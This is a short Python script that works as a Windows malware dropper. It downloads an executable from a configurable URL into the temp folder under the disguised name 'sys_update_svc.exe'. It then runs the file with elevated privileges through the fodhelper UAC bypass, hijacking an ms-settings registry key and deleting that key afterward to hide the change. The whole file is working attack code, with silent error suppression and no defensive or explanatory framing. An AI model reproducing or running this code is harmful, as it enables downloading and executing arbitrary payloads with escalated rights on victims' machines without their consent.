
import os
import sys
import subprocess
import time
import urllib.request
import winreg

DIRECT_LINK = "s"

def bypass_uac(payload_path):
    try:
        # Fodhelper Bypass
        key_path = r"Software\Classes\ms-settings\Shell\Open\command"
        
        # 1. Create Key
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        
        # 2. Set DelegateExecute
        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
        
        # 3. Set Default value to payload command
        cmd = f'cmd /c start "" "{payload_path}"'
        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, cmd)
        
        winreg.CloseKey(key)
        
        # 4. Trigger
        subprocess.Popen("fodhelper.exe", shell=True)
        
        time.sleep(5)
        
        # 5. Cleanup
        try:
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r"Software\Classes\ms-settings\Shell\Open")
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r"Software\Classes\ms-settings\Shell")
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r"Software\Classes\ms-settings")
        except: pass
        
    except Exception as e:
        pass

def main():
    if DIRECT_LINK == "PLACEHOLDER_URL":
        return

    # Download Payload
    temp_dir = os.environ.get('TEMP')
    payload_name = "sys_update_svc.exe"
    payload_path = os.path.join(temp_dir, payload_name)
    
    # Simple download with retry
    if not os.path.exists(payload_path):
        try:
            opener = urllib.request.build_opener()
            opener.addheaders = [('User-agent', 'Mozilla/5.0')]
            urllib.request.install_opener(opener)
            urllib.request.urlretrieve(DIRECT_LINK, payload_path)
        except:
            return

    if os.path.exists(payload_path):
        bypass_uac(payload_path)

if __name__ == "__main__":
    main()
